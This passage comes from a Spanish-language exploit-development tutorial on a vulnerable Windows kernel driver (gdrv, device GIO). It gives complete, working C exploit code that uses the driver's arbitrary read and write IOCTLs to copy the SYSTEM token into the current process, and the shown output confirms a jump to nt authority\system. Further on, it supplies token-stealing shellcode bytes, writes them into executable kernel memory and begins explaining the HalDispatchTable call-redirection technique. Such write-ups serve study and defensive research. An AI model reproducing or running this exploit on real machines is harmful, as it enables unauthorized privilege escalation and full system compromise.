<code><span class="na">QWORD GetCurrentEProcess</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> systemEProcess</span><span class="p">) {
    </span><span class="na">QWORD</span><span class="p"> currentEProcess</span><span class="o"> =</span><span class="p"> systemEProcess;
    </span><span class="na">DWORD</span><span class="p"> currentProcessId</span><span class="o"> =</span><span class="p"> GetCurrentProcessId();

    </span><span class="o">while</span><span class="p"> (</span><span class="mi">TRUE</span><span class="p">) {
        </span><span class="na">QWORD</span><span class="p"> processLinkAddress</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, currentEProcess </span><span class="o">+ </span><span class="p">OFFSET_ActiveProcessLinks);
        </span><span class="na">QWORD</span><span class="p"> processId</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, processLinkAddress</span><span class="o"> -</span><span class="p"> OFFSET_ActiveProcessLinks </span><span class="o">+</span><span class="p"> OFFSET_UniqueProcessId);

        currentEProcess</span><span class="o"> =</span><span class="p"> processLinkAddress</span><span class="o"> -</span><span class="p"> OFFSET_ActiveProcessLinks;

        </span><span class="o">if</span><span class="p"> ((</span><span class="na">DWORD</span><span class="p">) processId</span><span class="o"> ==</span><span class="p"> currentProcessId) {
            </span><span class="o">break</span><span class="p">;
        }
    }

    </span><span class="o">return</span><span class="p"> currentEProcess;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Entonces la explotación es simple, obtenemos la base del kernel que nos sirve para obtener el <code class="language-plaintext highlighter-rouge">_EPROCESS</code> de <code class="language-plaintext highlighter-rouge">System</code> que a su vez nos sirve para obtener el del actual, finalmente usamos <code class="language-plaintext highlighter-rouge">ArbitraryWrite</code> para escribir en el campo <code class="language-plaintext highlighter-rouge">Token</code> del proceso actual el <code class="language-plaintext highlighter-rouge">Token</code> del proceso <code class="language-plaintext highlighter-rouge">System</code>, ponemos unos <code class="language-plaintext highlighter-rouge">getchar()</code> para debuggear.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">GIO"</span><span class="p">, GENERIC_READ </span><span class="o">| </span><span class="p">GENERIC_WRITE, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">if</span><span class="p"> (hDevice </span><span class="o">==</span><span class="p"> INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">QWORD</span><span class="p"> kernelBase</span><span class="o"> =</span><span class="p"> GetKernelBase();
    </span><span class="no">printf</span><span class="p">(</span><span class="s">"[*] Kernel Base: 0x</span><span class="mi">%llx\n</span><span class="s">"</span><span class="p">, kernelBase);

    </span><span class="na">QWORD</span><span class="p"> systemEProcess</span><span class="o"> =</span><span class="p"> GetSystemEProcess(hDevice, kernelBase);
    </span><span class="no">printf</span><span class="p">(</span><span class="s">"[*] System _EPROCESS: 0x</span><span class="mi">%llx\n</span><span class="s">"</span><span class="p">, systemEProcess);

    </span><span class="na">QWORD</span><span class="p"> currentEProcess</span><span class="o"> =</span><span class="p"> GetCurrentEProcess(hDevice, systemEProcess);
    </span><span class="no">printf(</span><span class="s">"[*] Current _EPROCESS: 0x</span><span class="mi">%llx\n</span><span class="s">"</span><span class="p">, currentEProcess);

    </span><span class="no">getchar</span><span class="p">();

    ArbitraryWrite(hDevice, systemEProcess </span><span class="o">+</span><span class="p"> OFFSET_Token, currentEProcess</span><span class="o"> +</span><span class="p"> OFFSET_Token);
    CloseHandle(hDevice);

    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Al llegar al primer <code class="language-plaintext highlighter-rouge">getchar()</code> muestra las direcciones de las estructuras <code class="language-plaintext highlighter-rouge">_EPROCESS</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop></span><span class="am"> exploit.exe</span><span class="p">
[*] Kernel Base: 0xfffff80769c00000
[*] System _EPROCESS: 0xffff9201e827e040
[*] Current _EPROCESS: 0xffff9201eee082c0</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos comprobar que esto funcione correctamente revisando los atributos <code class="language-plaintext highlighter-rouge">ImageFileName</code>, el primero corresponde a <code class="language-plaintext highlighter-rouge">System</code> y el segundo a <code class="language-plaintext highlighter-rouge">exploit.exe</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> lm m nt
Browse full module list
start             end                 module name
fffff807`69c00000 fffff807`6ac46000   nt         (pdb symbols)

</span><span class="ro">0: kd></span><span class="p"> dt nt!_EPROCESS 0xffff9201e827e040 ImageFileName
   +0x5a8 ImageFileName : [15]  "System"

</span><span class="ro">0: kd></span><span class="p"> dt nt!_EPROCESS 0xffff9201eee082c0 ImageFileName
   +0x5a8 ImageFileName : [15]  "exploit.exe"</span>
</code></pre></div></div><br>

<p class="plain-text">Si continuamos hasta después del <code class="language-plaintext highlighter-rouge">ArbitraryWrite</code> vemos que los campos <code class="language-plaintext highlighter-rouge">Token</code> de ambos valores tienen exactamente el mismo valor, así cumplimos nuestro cometido.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">bp gdrv + 0x28d4

</span><span class="ro">0: kd></span><span class="p"> g
Breakpoint 0 hit
gdrv+0x28d4:
fffff807`6e9828d4 c3              ret

</span><span class="ro">0: kd></span><span class="p"> dt nt!_EX_FAST_REF 0xffff9201e827e040 + 0x4b8 Value
   +0x000 Value : 0xffffc601`154447f7

</span><span class="ro">0: kd></span><span class="p"> dt nt!_EX_FAST_REF 0xffff9201eee082c0 + 0x4b8 Value
   +0x000 Value : 0xffffc601`154447f7</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro exploit final es bastante simple, obtenemos las estructuras <code class="language-plaintext highlighter-rouge">_EPROCESS</code> del proceso <code class="language-plaintext highlighter-rouge">System</code> y del actual y escribimos el <code class="language-plaintext highlighter-rouge">Token</code> para robar así sus privilegios.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltwindows.h>
</span><span class="o">#include</span><span class="s"> &ltstdio.h>
</span><span class="o">#include</span><span class="s"> &ltpsapi.h>

</span><span class="o">#define</span><span class="na"> QWORD</span><span class="mi"> ULONGLONG
</span><span class="o">#define</span><span class="na"> IOCTL_COPY</span><span class="mi"> 0xC3502808

</span><span class="o">#define</span><span class="na"> OFFSET_Token</span><span class="mi"> 0x4b8
</span><span class="o">#define</span><span class="na"> OFFSET_UniqueProcessId</span><span class="mi"> 0X440
</span><span class="o">#define</span><span class="na"> OFFSET_ActiveProcessLinks</span><span class="mi"> 0x448

</span><span class="no">typedef struct</span><span class="p"> CopyData {
    </span><span class="na">QWORD</span><span class="p"> DstAddress;
    </span><span class="na">QWORD</span><span class="p"> SrcAddress;
    </span><span class="na">DWORD</span><span class="p"> Size;
} </span><span class="na">CopyData</span><span class="p">;

</span><span class="na">VOID ArbitraryWrite</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> what</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> where</span><span class="p">) {
    CopyData userData;

    userData.DstAddress</span><span class="o"> =</span><span class="p"> where;
    userData.SrcAddress</span><span class="o"> =</span><span class="p"> what;
    userData.Size</span><span class="o"> =</span><span class="mi"> 8</span><span class="p">;

    DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="o"> &</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">)</span><span class="o"> sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> CopyData), </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
}

</span><span class="na">QWORD ArbitraryRead</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> where</span><span class="p">) {
    </span><span class="na">QWORD</span><span class="p"> output;
    CopyData userData;

    userData.DstAddress </span><span class="o">=</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">output;
    userData.SrcAddress</span><span class="o"> =</span><span class="p"> where;
    userData.Size</span><span class="o"> =</span><span class="mi"> 8</span><span class="p">;

    DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="o"> &</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> CopyData), </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">return</span><span class="p"> output;
}

</span><span class="na">QWORD GetSystemEProcess</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> kernelBase</span><span class="p">) {
    </span><span class="na">HMODULE</span><span class="p"> hKernel </span><span class="o">= </span><span class="p">LoadLibraryA(</span><span class="s">"C:</span><span class="mi">\\</span><span class="s">Windows</span><span class="mi">\\</span><span class="s">System32</span><span class="mi">\\</span><span class="s">ntoskrnl.exe"</span><span class="p">);

    </span><span class="na">QWORD</span><span class="p"> userPsInitialProcess</span><span class="o"> =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) GetProcAddress(hKernel, </span><span class="s">"PsInitialSystemProcess"</span><span class="p">);
    </span><span class="na">QWORD</span><span class="p"> offsetPsInitialProcess</span><span class="o"> =</span><span class="p"> userPsInitialProcess</span><span class="o"> -</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) hKernel;
    </span><span class="na">QWORD</span><span class="p"> kernelPsInitialProcess</span><span class="o"> =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="p"> offsetPsInitialProcess;

    </span><span class="na">QWORD</span><span class="p"> systemEProcess </span><span class="o">=</span><span class="p"> ArbitraryRead(hDevice, kernelPsInitialProcess);

    FreeLibrary(hKernel);
    </span><span class="o">return</span><span class="p"> systemEProcess;
}

</span><span class="na">QWORD GetCurrentEProcess</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> systemEProcess</span><span class="p">) {
    </span><span class="na">QWORD</span><span class="p"> currentEProcess</span><span class="o"> =</span><span class="p"> systemEProcess;
    </span><span class="na">DWORD</span><span class="p"> currentProcessId</span><span class="o"> =</span><span class="p"> GetCurrentProcessId();

    </span><span class="o">while</span><span class="p"> (</span><span class="mi">TRUE</span><span class="p">) {
        </span><span class="na">QWORD</span><span class="p"> processLinkAddress</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, currentEProcess </span><span class="o">+ </span><span class="p">OFFSET_ActiveProcessLinks);
        </span><span class="na">QWORD</span><span class="p"> processId</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, processLinkAddress</span><span class="o"> -</span><span class="p"> OFFSET_ActiveProcessLinks </span><span class="o">+</span><span class="p"> OFFSET_UniqueProcessId);

        currentEProcess</span><span class="o"> =</span><span class="p"> processLinkAddress</span><span class="o"> -</span><span class="p"> OFFSET_ActiveProcessLinks;

        </span><span class="o">if</span><span class="p"> ((</span><span class="na">DWORD</span><span class="p">) processId</span><span class="o"> ==</span><span class="p"> currentProcessId) {
            </span><span class="o">break</span><span class="p">;
        }
    }

    </span><span class="o">return</span><span class="p"> currentEProcess;
}

</span><span class="na">QWORD</span><span class="na"> GetKernelBase</span><span class="p">() {
    </span><span class="na">LPVOID</span><span class="p"> drivers[</span><span class="mi">1024</span><span class="p">];
    </span><span class="na">DWORD</span><span class="p"> cbNeeded;

    EnumDeviceDrivers(drivers, </span><span class="o">sizeof</span><span class="p">(drivers),</span><span class="o"> &</span><span class="p">cbNeeded);
    </span><span class="o">return</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) drivers[</span><span class="mi">0</span><span class="p">];
}

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">GIO"</span><span class="p">, GENERIC_READ </span><span class="o">| </span><span class="p">GENERIC_WRITE, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">if</span><span class="p"> (hDevice </span><span class="o">==</span><span class="p"> INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">QWORD</span><span class="p"> systemEProcess </span><span class="o">= </span><span class="p">GetSystemEProcess(hDevice, GetKernelBase());
    </span><span class="na">QWORD</span><span class="p"> currentEProcess</span><span class="o"> =</span><span class="p"> GetCurrentEProcess(hDevice, systemEProcess);

    ArbitraryWrite(hDevice, systemEProcess </span><span class="o">+ </span><span class="p">OFFSET_Token, currentEProcess</span><span class="o"> +</span><span class="p"> OFFSET_Token);
    CloseHandle(hDevice);

    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el exploit deberiamos pasar de la shell como el usuario llamado <code class="language-plaintext highlighter-rouge">user</code> con pocos privilegios a <code class="language-plaintext highlighter-rouge">nt authority\system</code> que es el usuario con máximos privilegios.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop> </span><span class="am">whoami</span><span class="p">
windows\user

C:\Users\user\Desktop> </span><span class="am">exploit.exe</span><span class="p">
Microsoft Windows [Versión 10.0.19045.6456]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Users\user\Desktop> </span><span class="am">whoami</span><span class="p">
nt authority\system

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

</section>

<section class="post" id="shellcode">
<br><h3 class="post-title">Execute Shellcode</h3><br>

<p class="plain-text">Tenemos una primitiva de escritura no controlamos un <code class="language-plaintext highlighter-rouge">callback</code> que podríamos redirigir a un <code class="language-plaintext highlighter-rouge">shellcode</code>, nuestro trabajo será buscar una forma de llamar a una dirección que al final nos permita ejecutar un shellcode como un <a href="/exploit-development/windows-kernel/kernel-shellcode#token-stealing">token stealing</a>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">BYTE</span><span class="p"> tokenStealing[</span><span class="mi">60</span><span class="p">]</span><span class="o"> =</span><span class="p"> {
    </span><span class="mi">0x65</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x14</span><span class="p">,</span><span class="mi"> 0x25</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1"> // mov rdx, [gs:0x188]              ; $rdx = _KTHREAD
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x82</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rax, [rdx + 0xb8]            ; $rax = _EPROCESS
    </span><span class="mi">0x50</span><span class="p">,</span><span class="mi"> 0x5b</span><span class="p">,</span><span class="c1">                                           // mov rbx, rax                     ; $rbx = _EPROCESS
                                                          // .loop:
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9b</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     mov rbx, [rbx + 0x448]       ; $rbx = ActiveProcessLinks
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x81</span><span class="p">,</span><span class="mi"> 0xeb</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     sub rbx, 0x448               ; $rbx = _EPROCESS
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xbb</span><span class="p">,</span><span class="mi"> 0x40</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="c1">       //     cmp qword [rbx + 0x440], 0x4 ; cmp PID to SYSTEM PID
    </span><span class="mi">0x75</span><span class="p">,</span><span class="mi"> 0xe8</span><span class="p">,</span><span class="c1">                                           //     jnz .loop                    ; if zf == 0 -> loop
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rcx, [rbx + 0x4b8]           ; $rcx = SYSTEM token
    </span><span class="mi">0x80</span><span class="p">,</span><span class="mi"> 0xe1</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="p">,</span><span class="c1">                                     // and cl, 0xf0                     ; clear _EX_FAST_REF struct
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov [rax + 0x4b8], rcx           ; store SYSTEM token in _EPROCESS
    </span><span class="mi">0xc3</span><span class="c1">                                                  // ret                              ; return
</span><span class="p">};</span>
</code></pre></div></div><br>

<p class="plain-text">Basados en el <a href="#reversing">reversing</a> que hicimos al inicio veamos el funcionamiento del <code class="language-plaintext highlighter-rouge">ioctl</code> <code class="language-plaintext highlighter-rouge">0xC3502800</code>, sabemos que reserva un espacio en memoria por lo que creamos una función <code class="language-plaintext highlighter-rouge">AllocMemory</code> en la cual controlamos la longitud, la variable de retorno es un <code class="language-plaintext highlighter-rouge">qword</code> con la dirección que reservó, pasaremos a analizar su comportamiento.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#define</span><span class="na"> IOCTL_ALLOC</span><span class="mi"> 0xC3502800

</span><span class="na">QWORD AllocMemory</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> DWORD</span><span class="ra"> size</span><span class="p">) {
    </span><span class="na">DWORD</span><span class="p"> input</span><span class="o"> =</span><span class="p"> size;
    </span><span class="na">QWORD</span><span class="p"> output[</span><span class="mi">2</span><span class="p">];

    DeviceIoControl(hDevice, IOCTL_ALLOC, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="o"> &</span><span class="p">input,</span><span class="o"> sizeof</span><span class="p">(input), (</span><span class="na">LPVOID</span><span class="p">) output, </span><span class="o">sizeof</span><span class="p">(output), </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">return</span><span class="p"> output[</span><span class="mi">0</span><span class="p">];
}</span>
</code></pre></div></div><br>

<p class="plain-text">Ya que tenemos que escribir un shellcode completamente cambiaremos el atributo <code class="language-plaintext highlighter-rouge">Size</code> de <code class="language-plaintext highlighter-rouge">ArbitraryWrite</code> de un <code class="language-plaintext highlighter-rouge">8</code> estático a un valor que pasemos por parámetro.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">VOID ArbitraryWrite</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> what</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> where</span><span class="p">,</span><span class="na"> DWORD</span><span class="ra"> size</span><span class="p">) {
    CopyData userData;

    userData.DstAddress</span><span class="o"> =</span><span class="p"> where;
    userData.SrcAddress</span><span class="o"> =</span><span class="p"> what;
    userData.Size</span><span class="o"> =</span><span class="p"> size;

    DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">) </span><span class="o">&</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> CopyData), </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
}</span>
</code></pre></div></div><br>

<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">AllocMemory</code> reservamos un espacio en memoria del tamaño de nuestro shellcode, luego escribimos todos sus bytes en esa dirección con <code class="language-plaintext highlighter-rouge">ArbitraryWrite</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">GIO"</span><span class="p">, GENERIC_READ </span><span class="o">|</span><span class="p"> GENERIC_WRITE, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">if</span><span class="p"> (hDevice</span><span class="o"> ==</span><span class="p"> INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">QWORD</span><span class="p"> shellcode </span><span class="o">= </span><span class="p">AllocMemory(hDevice,</span><span class="o"> sizeof</span><span class="p">(tokenStealing));
    ArbitraryWrite(hDevice, (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">tokenStealing, shellcode,</span><span class="o"> sizeof</span><span class="p">(tokenStealing));

    </span><span class="no">printf</span><span class="p">(</span><span class="s">"[*] Allocated Memory: 0x</span><span class="mi">%llx\n</span><span class="s">"</span><span class="p">, shellcode);
    </span><span class="no">getchar</span><span class="p">();

    CloseHandle(hDevice);
    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Ejecutamos el exploit y se reserva un espacio en memoria, si analizamos la dirección por sus bytes iniciales que son <code class="language-plaintext highlighter-rouge">0xffff</code>, sabemos que está en espacio de kernel.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop></span><span class="am"> exploit.exe</span><span class="p">
[*] Allocated Memory: 0xffffce80f8e9b000</span>
</code></pre></div></div><br>

<p class="plain-text">Si miramos desde el debugger hemos logrado copiar todo nuestro shellcode a esa dirección, y ya que está en modo kernel no afectarán protecciones como <code class="language-plaintext highlighter-rouge">SMEP</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> u 0xffffce80f8e9b000 L0xc
ffffce80`f8e9b000 65488b142588010000 mov     rdx,qword ptr gs:[188h]
ffffce80`f8e9b009 488b82b8000000     mov     rax,qword ptr [rdx+0B8h]
ffffce80`f8e9b010 50                 push    rax
ffffce80`f8e9b011 5b                 pop     rbx
ffffce80`f8e9b012 488b9b48040000     mov     rbx,qword ptr [rbx+448h]
ffffce80`f8e9b019 4881eb48040000     sub     rbx,448h
ffffce80`f8e9b020 4883bb4004000004   cmp     qword ptr [rbx+440h],4
ffffce80`f8e9b028 75e8               jne     ffffce80`f8e9b012
ffffce80`f8e9b02a 488b8bb8040000     mov     rcx,qword ptr [rbx+4B8h]
ffffce80`f8e9b031 80e1f0             and     cl,0F0h
ffffce80`f8e9b034 488988b8040000     mov     qword ptr [rax+4B8h],rcx
ffffce80`f8e9b03b c3                 ret</span>
</code></pre></div></div><br>

<p class="plain-text">Algo muy importante para poder ejecutarlo es que tenga los permisos correctos, si miramos los permisos de la <code class="language-plaintext highlighter-rouge">PTE</code> en esa dirección encontramos que el bit <code class="language-plaintext highlighter-rouge">XD</code> o <code class="language-plaintext highlighter-rouge">NoExecute</code> o está deshabilitado por lo que este espacio en memoria es ejecutable.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> !pte 0xffffce80f8e9b000
                                           VA ffffce80f8e9b000
PXE at FFFFDF6FB7DBECE8    PPE at FFFFDF6FB7D9D018    PDE at FFFFDF6FB3A03E38    PTE at FFFFDF67407C74D8
contains 0A00000005330863  contains 0A00000005331863  contains 0A000001F5686863  contains 0A00000000FFE963
pfn 5330      ---DA--KWEV  pfn 5331      ---DA--KWEV  pfn 1f5686    ---DA--KWEV  pfn ffe       -G-DA--KWEV

</span><span class="ro">0: kd></span><span class="p"> dt nt!_MMPTE_HARDWARE 0xffffdf67407c74d8
   +0x000 Valid               : 0y1
   +0x000 Dirty1              : 0y1
   +0x000 Owner               : 0y0
   +0x000 WriteThrough        : 0y0
   +0x000 CacheDisable        : 0y0
   +0x000 Accessed            : 0y1
   +0x000 Dirty               : 0y1
   +0x000 LargePage           : 0y0
   +0x000 Global              : 0y1
   +0x000 CopyOnWrite         : 0y0
   +0x000 Unused              : 0y0
   +0x000 Write               : 0y1
   +0x000 PageFrameNumber     : 0y000000000000000000000000111111111110 (0xffe)
   +0x000 ReservedForHardware : 0y0000
   +0x000 ReservedForSoftware : 0y0000
   +0x000 WsleAge             : 0y1010
   +0x000 WsleProtection      : 0y000
   +0x000 NoExecute           : 0y0</span>
</code></pre></div></div><br>

<p class="plain-text">Tenemos un espacio en memoria ejecutable en modo kernel con el shellcode, solo necesitamos encontrar una forma de ejecutarlo, hay una técnica conocida utilizando <code class="language-plaintext highlighter-rouge">NtQueryIntervalProfile</code>, vamos a analizar porque se usa esta función, si abrimos <code class="language-plaintext highlighter-rouge">ntoskrnl.exe</code> en IDA podemos ver que esta función llama a <code class="language-plaintext highlighter-rouge">KeQueryIntervalProfile</code>.</p>
<a href="/exploit-development/windows-kernel/arbitrary-write/16.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/arbitrary-write/16.png"></p></div></a>

<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">KeQueryIntervalProfile</code> inicia moviendo al registro <code class="language-plaintext highlighter-rouge">rax</code> lo que se encuentra en el offset <code class="language-plaintext highlighter-rouge">0xc00a68</code>, luego llama a <code class="language-plaintext highlighter-rouge">_guard_dispatch_icall</code>.</p>
<a href="/exploit-development/windows-kernel/arbitrary-write/17.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/arbitrary-write/17.png"></p></div></a>

<p class="plain-text">Si miramos la instrucción <code class="language-plaintext highlighter-rouge">mov rax</code> en el debugger veremos que mueve el valor en <code class="language-plaintext highlighter-rouge">HalDispatchTable+0x8</code> que dentro contiene un puntero a <code class="language-plaintext highlighter-rouge">HaliQuerySystemInformation</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">u nt + 0x734400 L1
nt!KeQueryIntervalProfile+0x1c:
fffff804`39534400 488b0561c64c00  mov     rax,qword ptr [nt!HalDispatchTable+0x8 (fffff804`39a00a68)]

</span><span class="ro">0: kd></span><span class="p"> dqs nt!HalDispatchTable + 0x8 L1
fffff804`39a00a68  fffff804`3978f9d0 nt!HaliQuerySystemInformation</span>
</code></pre></div></div><br>

